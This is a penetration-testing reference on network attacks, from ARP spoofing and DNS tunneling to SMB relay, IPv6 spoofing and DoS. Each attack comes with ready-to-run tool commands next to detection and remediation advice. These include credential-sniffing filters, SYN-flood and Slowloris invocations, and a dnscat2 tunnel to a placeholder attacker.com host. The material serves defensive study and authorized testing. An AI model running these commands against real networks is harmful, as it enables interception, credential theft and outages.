# Network Attacks Reference

## Overview
Network attacks target vulnerabilities in network protocols, infrastructure, and communications. These attacks can intercept, modify, or disrupt network traffic.

**MITRE ATT&CK**: T1557 (Adversary-in-the-Middle), T1040 (Network Sniffing), T1590 (Gather Victim Network Information)

---

## Man-in-the-Middle (MitM) Attacks

### Description
Intercepting and potentially modifying communications between two parties without their knowledge.

### Attack Types
- **ARP Spoofing**: Poisoning ARP cache to redirect traffic
- **DNS Spoofing**: Providing false DNS responses
- **SSL/TLS Stripping**: Downgrading HTTPS to HTTP
- **BGP Hijacking**: Manipulating routing tables

### Tools
- Ettercap
- Bettercap
- mitmproxy
- Wireshark
- SSLstrip
- Responder

### Testing Methodology
1. Position yourself on the same network segment
2. Perform ARP spoofing to intercept traffic
3. Capture and analyze network traffic
4. Attempt SSL/TLS stripping
5. Test for certificate validation
6. Intercept and modify HTTP/HTTPS traffic

### Example Commands
```bash
# Ettercap ARP poisoning
ettercap -T -M arp:remote /192.168.1.1// /192.168.1.10//

# Bettercap
bettercap -eval "set arp.spoof.targets 192.168.1.10; arp.spoof on; net.sniff on"

# SSLstrip
sslstrip -l 8080

# mitmproxy
mitmproxy -p 8080 --mode transparent
```

### Detection Methods
- ARP inspection (Dynamic ARP Inspection)
- Certificate pinning
- HSTS enforcement
- Network behavior analysis
- MAC address monitoring

### Remediation
- Implement Dynamic ARP Inspection (DAI)
- Use DNSSEC
- Enforce HTTPS with HSTS
- Implement certificate pinning
- Use encrypted protocols (SSH, VPN)
- Network segmentation
- Monitor for ARP anomalies

### References
- **MITRE ATT&CK**: T1557.002 (ARP Cache Poisoning)
- **CWE**: CWE-300 (Channel Accessible by Non-Endpoint)
- **CVE Examples**: N/A (protocol-level attack)
- **CAPEC**: CAPEC-94 (Adversary in the Middle)

---

## ARP Spoofing/Poisoning

### Description
Sending fake ARP messages to associate the attacker's MAC address with another host's IP address.

### Tools
- arpspoof (dsniff)
- Ettercap
- Bettercap
- Cain & Abel (Windows)

### Testing Methodology
1. Identify target hosts on the network
2. Enable IP forwarding
3. Perform ARP spoofing between target and gateway
4. Capture traffic with packet sniffer
5. Analyze intercepted data

### Example Commands
```bash
# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# arpspoof
arpspoof -i eth0 -t 192.168.1.10 192.168.1.1
arpspoof -i eth0 -t 192.168.1.1 192.168.1.10

# Capture traffic
tcpdump -i eth0 -w capture.pcap
```

### Detection Methods
- Monitor for duplicate MAC addresses
- Detect MAC address changes for static IPs
- Use static ARP entries for critical systems
- Deploy ARP monitoring tools (arpwatch)
- Enable Dynamic ARP Inspection (DAI)

### Remediation
- Implement Dynamic ARP Inspection
- Use static ARP entries
- Enable port security
- Implement network segmentation
- Use encrypted communications

### References
- **MITRE ATT&CK**: T1557.002
- **CWE**: CWE-300
- **CAPEC**: CAPEC-603 (ARP Spoofing)

---

## DNS Attacks

### Description
Exploiting vulnerabilities in DNS infrastructure or implementations to redirect, intercept, or disrupt name resolution.

### Attack Types
- **DNS Spoofing/Poisoning**: Providing false DNS responses
- **DNS Cache Poisoning**: Corrupting resolver cache
- **DNS Tunneling**: Exfiltrating data via DNS queries
- **DNS Amplification**: DDoS using DNS reflection
- **DNS Zone Transfer**: Unauthorized zone data retrieval

### Tools
- dnsspoof (dsniff)
- Bettercap
- dnscat2 (DNS tunneling)
- fierce (zone enumeration)
- dnsrecon
- dig, nslookup

### Testing Methodology
1. Identify DNS servers
2. Test for zone transfers (AXFR)
3. Perform DNS cache poisoning attempts
4. Test DNS recursion
5. Enumerate subdomains
6. Test for DNS tunneling capabilities

### Example Commands
```bash
# Zone transfer attempt
dig @dns-server.com domain.com AXFR

# DNS reconnaissance
dnsrecon -d domain.com -t axfr
fierce --domain domain.com

# DNS cache poisoning detection
dig @resolver domain.com +dnssec

# DNS tunneling
dnscat2 --dns server=attacker.com
```

### Detection Methods
- Monitor for unusual DNS query patterns
- Implement DNSSEC validation
- Rate limiting on DNS servers
- Detect zone transfer attempts
- Monitor for DNS tunneling patterns

### Remediation
- Implement DNSSEC
- Restrict zone transfers
- Disable DNS recursion on authoritative servers
- Use rate limiting
- Monitor DNS traffic for anomalies
- Keep DNS software updated

### References
- **MITRE ATT&CK**: T1071.004 (DNS Protocol), T1048.003 (Exfiltration Over Asymmetric Channel)
- **CWE**: CWE-350 (Reliance on Reverse DNS Resolution)
- **CVE Examples**: CVE-2020-1350 (SIGRed)
- **CAPEC**: CAPEC-89 (Pharming), CAPEC-142 (DNS Cache Poisoning)

---

## Network Sniffing

### Description
Capturing and analyzing network traffic to extract sensitive information.

### What Can Be Captured
- Credentials (plaintext protocols)
- Session tokens
- Sensitive data
- Network topology information
- Traffic patterns

### Tools
- Wireshark
- tcpdump
- tshark
- Ettercap
- NetworkMiner
- Snort

### Testing Methodology
1. Place network adapter in promiscuous mode
2. Capture network traffic
3. Filter for interesting protocols (HTTP, FTP, Telnet)
4. Extract credentials and sensitive data
5. Reconstruct sessions
6. Analyze traffic patterns

### Example Commands
```bash
# tcpdump
tcpdump -i eth0 -w capture.pcap
tcpdump -i eth0 'port 80 or port 443'
tcpdump -i eth0 -A 'tcp port 21'  # FTP

# tshark
tshark -i eth0 -f "tcp port 80" -Y "http.request"
tshark -r capture.pcap -Y "http.request.method == POST"

# Extract HTTP passwords
tshark -r capture.pcap -Y "http.authbasic" -T fields -e http.authbasic
```

### Detection Methods
- Network adapter in promiscuous mode detection
- Encrypted traffic enforcement
- Network segmentation
- IDS/IPS signatures

### Remediation
- Use encrypted protocols (HTTPS, SSH, SFTP, VPN)
- Implement network segmentation
- Use switched networks (not hubs)
- Enable port security
- Monitor for promiscuous mode interfaces

### References
- **MITRE ATT&CK**: T1040 (Network Sniffing)
- **CWE**: CWE-319 (Cleartext Transmission of Sensitive Information)
- **CAPEC**: CAPEC-158 (Sniffing Network Traffic)

---

## Port Scanning & Enumeration

### Description
Systematically probing target systems to identify open ports, services, and potential vulnerabilities.

### Scan Types
- **TCP Connect Scan**: Full three-way handshake
- **SYN Scan**: Stealth scan (half-open)
- **UDP Scan**: Slower, connectionless protocol
- **FIN/NULL/Xmas Scans**: Firewall evasion
- **ACK Scan**: Firewall rule detection

### Tools
- Nmap
- Masscan
- RustScan
- Unicornscan
- Zmap

### Testing Methodology
1. Perform initial reconnaissance
2. Port scan target ranges
3. Service version detection
4. Operating system detection
5. Script scanning for vulnerabilities
6. Banner grabbing

### Example Commands
```bash
# Basic nmap scans
nmap -sS -sV -sC -oA results target.com
nmap -p- --min-rate 10000 target.com  # Fast full port scan
nmap -sU --top-ports 100 target.com   # UDP scan

# Masscan (very fast)
masscan -p1-65535 --rate=10000 10.0.0.0/8

# Service detection
nmap -sV --version-intensity 9 target.com

# OS detection
nmap -O target.com

# NSE scripts
nmap --script vuln target.com
nmap --script default,safe target.com
```

### Detection Methods
- Port scan detection IDS rules
- Rate limiting
- Honeypots
- Connection monitoring
- Packet analysis

### Remediation
- Minimize exposed services
- Use firewall rules
- Implement rate limiting
- Deploy IDS/IPS
- Use port knocking for sensitive services
- Regular security audits

### References
- **MITRE ATT&CK**: T1046 (Network Service Discovery)
- **CWE**: N/A (reconnaissance technique)
- **CAPEC**: CAPEC-300 (Port Scanning)

---

## VLAN Hopping

### Description
Exploiting VLAN configurations to access traffic from other VLANs.

### Attack Methods
- **Switch Spoofing**: Pretending to be a switch
- **Double Tagging**: Exploiting 802.1Q tagging

### Tools
- Yersinia
- Scapy
- Custom scripts

### Testing Methodology
1. Identify VLAN configuration
2. Test for DTP (Dynamic Trunking Protocol)
3. Attempt switch spoofing
4. Test double tagging attack
5. Verify VLAN isolation

### Example Commands
```bash
# Using Yersinia for DTP attack
yersinia -G  # GUI mode

# Scapy double tagging
from scapy.all import *
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=100)/IP(dst="target")/ICMP()
sendp(packet)
```

### Detection Methods
- Disable DTP on access ports
- Monitor for unauthorized trunk ports
- VLAN Access Control Lists
- Port security

### Remediation
- Disable DTP on all access ports
- Explicitly configure trunk ports
- Use VLAN pruning
- Implement Private VLANs
- Regular VLAN configuration audits

### References
- **MITRE ATT&CK**: T1599.001 (Network Address Translation Traversal)
- **CWE**: CWE-284 (Improper Access Control)
- **CAPEC**: CAPEC-605 (VLAN Hopping)

---

## SMB/NetBIOS Attacks

### Description
Exploiting vulnerabilities in SMB/CIFS and NetBIOS protocols common in Windows networks.

### Attack Types
- **SMB Relay**: Relaying authentication
- **Pass-the-Hash**: Using NTLM hashes
- **EternalBlue**: SMBv1 exploitation
- **NetBIOS Name Poisoning**: NBNS/LLMNR spoofing

### Tools
- Responder
- Impacket (ntlmrelayx)
- CrackMapExec
- Metasploit (EternalBlue)
- enum4linux
- smbclient

### Testing Methodology
1. Enumerate SMB shares
2. Test for null sessions
3. Attempt SMB relay attacks
4. Test for SMBv1 (EternalBlue)
5. Perform NBNS/LLMNR poisoning
6. Extract credentials

### Example Commands
```bash
# Enumerate SMB
enum4linux -a target.com
smbclient -L //target.com -N

# SMB shares
smbmap -H target.com
crackmapexec smb target.com -u '' -p '' --shares

# Responder (LLMNR/NBNS poisoning)
responder -I eth0 -wrf

# SMB relay
ntlmrelayx.py -tf targets.txt -smb2support

# EternalBlue check
nmap --script smb-vuln-ms17-010 target.com
```

### Detection Methods
- Disable SMBv1
- Monitor for unusual SMB traffic
- Detect Responder activity
- Implement SMB signing
- Network segmentation

### Remediation
- Disable SMBv1 completely
- Enable SMB signing
- Disable LLMNR and NetBIOS
- Use network segmentation
- Implement strong authentication
- Apply security patches

### References
- **MITRE ATT&CK**: T1021.002 (SMB/Windows Admin Shares)
- **CWE**: CWE-294 (Authentication Bypass by Capture-replay)
- **CVE Examples**: CVE-2017-0144 (EternalBlue)
- **CAPEC**: CAPEC-555 (Remote Services)

---

## IPv6 Attacks

### Description
Exploiting IPv6 protocol features and implementation issues.

### Attack Types
- **Router Advertisement Flooding**
- **Neighbor Discovery Protocol Spoofing**
- **DHCPv6 Spoofing**
- **IPv6 Tunneling for Evasion**

### Tools
- THC-IPv6 toolkit
- Scapy
- Chiron
- atear6 (RA flooding)
- parasite6 (SLAAC attack)

### Testing Methodology
1. Check for IPv6 enablement
2. Perform IPv6 neighbor discovery
3. Test for RA flooding vulnerability
4. Attempt DHCPv6 spoofing
5. Test for IPv6 tunneling
6. MitM attacks via NDP spoofing

### Example Commands
```bash
# IPv6 alive detection
alive6 eth0

# Router Advertisement flooding
atear6 eth0

# Fake router advertisement
fake_router6 eth0 2001:db8::1/64

# IPv6 MitM
parasite6 eth0
```

### Detection Methods
- IPv6 first-hop security features
- RA guard
- DHCPv6 guard
- Monitor for IPv6 traffic on IPv4-only networks

### Remediation
- Disable IPv6 if not needed
- Implement IPv6 first-hop security
- Enable RA Guard
- Use DHCPv6 Guard
- Apply IPv6 ACLs
- Monitor IPv6 traffic

### References
- **MITRE ATT&CK**: T1557 (Adversary-in-the-Middle)
- **CWE**: CWE-300
- **RFC**: RFC 7113 (IPv6 Security)
- **CAPEC**: CAPEC-603

---

## Denial of Service (DoS/DDoS)

### Description
Overwhelming systems or networks to disrupt service availability.

### Attack Types
- **SYN Flood**: TCP half-open connections
- **UDP Flood**: High volume UDP packets
- **HTTP Flood**: Application layer DoS
- **Amplification Attacks**: DNS, NTP, SSDP reflection
- **Slowloris**: Slow HTTP attacks

### Tools
- hping3
- LOIC/HOIC
- Slowloris
- GoldenEye
- HULK

**Note**: DoS testing should only be performed with explicit authorization and in controlled environments.

### Testing Methodology
1. Obtain explicit authorization
2. Baseline normal traffic patterns
3. Perform controlled stress testing
4. Test rate limiting mechanisms
5. Verify DDoS mitigation services
6. Document impact thresholds

### Example Commands
```bash
# SYN flood (hping3)
hping3 -S -p 80 --flood target.com

# Slowloris
slowloris -s 500 target.com

# Note: Only use in authorized testing environments
```

### Detection Methods
- Traffic rate analysis
- Connection state monitoring
- Behavioral analysis
- DDoS mitigation services (Cloudflare, Akamai)
- Netflow analysis

### Remediation
- Implement rate limiting
- Use DDoS mitigation services
- Deploy load balancers
- Implement SYN cookies
- Use CDN services
- Configure proper timeouts
- Implement connection limits

### References
- **MITRE ATT&CK**: T1498 (Network Denial of Service)
- **CWE**: CWE-400 (Uncontrolled Resource Consumption)
- **CVE Examples**: Various application-specific
- **CAPEC**: CAPEC-125 (Flooding), CAPEC-488 (HTTP Flood)
